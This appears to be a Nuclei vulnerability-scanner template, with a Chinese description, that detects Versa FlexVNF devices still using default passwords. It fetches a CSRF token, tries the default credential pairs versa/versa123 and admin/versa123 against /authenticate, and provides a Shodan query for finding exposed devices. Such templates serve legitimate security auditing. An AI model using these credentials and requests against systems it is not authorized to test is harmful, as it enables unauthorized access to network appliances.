id: versa-flexvnf-default-login

info:
  name: Versa FlexVNF 默认口令登录（弱口令）
  author: c-sh0
  severity: high
  description: 该模板通过尝试 Versa FlexVNF 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://versa-networks.com/products/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:o:versa-networks:versa_operating_system:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    shodan-query: title:"Flex VNF Web-UI"
    product: versa_operating_system
    vendor: versa-networks
  tags: default-login,versa,flexvnf,vuln

http:
  - raw:
      - |
        GET /authenticate HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /authenticate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8
        CSRF-Token: {{xsrf_token}}

        {"username":"{{username}}","password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - versa
        - admin
      password:
        - versa123
        - versa123
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{\"username\":\"{{username}}\",\"error\":false}"

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: xsrf_token
        group: 1
        internal: true
        part: header
        regex:
          - '(?i)Set-Cookie: XSRF-TOKEN=([A-Za-z0-9_.-]+)'
